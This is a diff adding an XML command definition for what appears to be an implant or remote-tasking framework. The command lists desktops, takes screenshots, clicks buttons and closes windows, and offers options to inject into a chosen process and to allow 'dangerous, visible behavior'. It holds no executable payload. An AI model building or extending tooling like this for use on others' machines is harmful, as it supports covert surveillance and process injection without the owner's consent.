@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Plugin providerName='Tasking/Mcl_Cmd_Windows_Tasking.pyo' providerType='script'>
+	
+    <Command name="Windows" id="0">
+
+		<Help>Performs WindowStation/Desktop functions</Help>
+		
+		<Input>
+			<Option name='list' optional='false' group='type'>
+				<Set data='type' value='1'/>
+				<Help>List the WindowStations and Desktops</Help>
+			</Option>
+			
+			<Option name='screenshot' optional='false' group='type'>
+				<Set data='type' value='2'/>
+				<Help>Take a screenshot of the given desktop</Help>
+
+				<Argument name='resolution' optional='true'>
+					<Value string='default'>
+						<Set data='resolution' value='1'/>
+					</Value>
+					<Value string='low'>
+						<Set data='resolution' value='0'/>
+					</Value>
+					<Value string='medium'>
+						<Set data='resolution' value='1'/>
+					</Value>
+					<Value string='high'>
+						<Set data='resolution' value='2'/>
+					</Value>
+				</Argument>
+				<Argument name='format' optional='true'>
+					<Value string='default'>
+						<Set data='format' value='0'/>
+					</Value>
+					<Value string='bmp'>
+						<Set data='format' value='0'/>
+					</Value>
+					<Value string='gif'>
+						<Set data='format' value='1'/>
+					</Value>
+					<Value string='jpeg'>
+						<Set data='format' value='2'/>
+					</Value>
+					<Value string='png'>
+						<Set data='format' value='3'/>
+					</Value>
+				</Argument>
+				<Argument name='hWnd' data='hWnd' optional='true'/>
+			</Option>
+			
+			<Option name='close' optional='false' group='type'>
+				<Set data='type' value='3'/>
+				<Help>Attempts to close a given window</Help>
+				<Argument name='hWnd' data='hWnd'/>
+			</Option>
+			
+			<Option name='clickbutton' optional='false' group='type'>
+				<Set data='type' value='4'/>
+				<Help>Clicks a button with a given name on a specified window</Help>
+				<Argument name='hWnd' data='hWnd'/>
+				<Argument name='buttonText' data='buttonText'/>
+			</Option>
+			
+			<Option name='buttons' optional='false' group='type'>
+				<Set data='type' value='5'/>
+				<Help>List the buttons on a window</Help>
+				<Argument name='hWnd' data='hWnd'/>
+			</Option>
+			
+			<Option name='location' optional='true'>
+				<Help>Sets command's target location</Help>
+				<Argument name='windowstation' data='windowStation'/>
+				<Argument name='desktop' data='desktop'/>
+			</Option>
+
+			<Option name='id' optional='true'>
+				<Help>Inject command into specified process</Help>
+				<Argument name='Parent Process Id' data='id'/>
+			</Option>
+
+			<Option name='force' optional='true'>
+				<Set data='force' value='true'/>
+				<Help>Allow use of dangerous, visible behavior</Help>
+			</Option>
+
+			<Option name='method' optional='true'>
+				<Help>Specifies injection and memory method - will use current default if not specified.</Help>
+				<Argument name='inject' data='injectMethod'/>
+				<Argument name='memory' data='memoryMethod'/>
+			</Option>
+		</Input>
+		
+		<Output>
+			<Data name='type' type='uint8_t' default='0'/>
+			<Data name='windowStation' type='string'/>
+			<Data name='desktop' type='string'/>
+			<Data name='hWnd' type='uint64_t'/>
+			<Data name='buttonText' type='string'/>
+			<Data name='resolution' type='uint8_t' default='0'/>
+			<Data name='format' type='uint8_t' default='0'/>
+			<Data name='id' type='uint32_t' default='0'/>
+			<Data name='force' type='bool' default='false'/>
+			<Data name='injectMethod' type='string'/>
+			<Data name='memoryMethod' type='string'/>
+		</Output>
+
+    </Command>
+</Plugin>
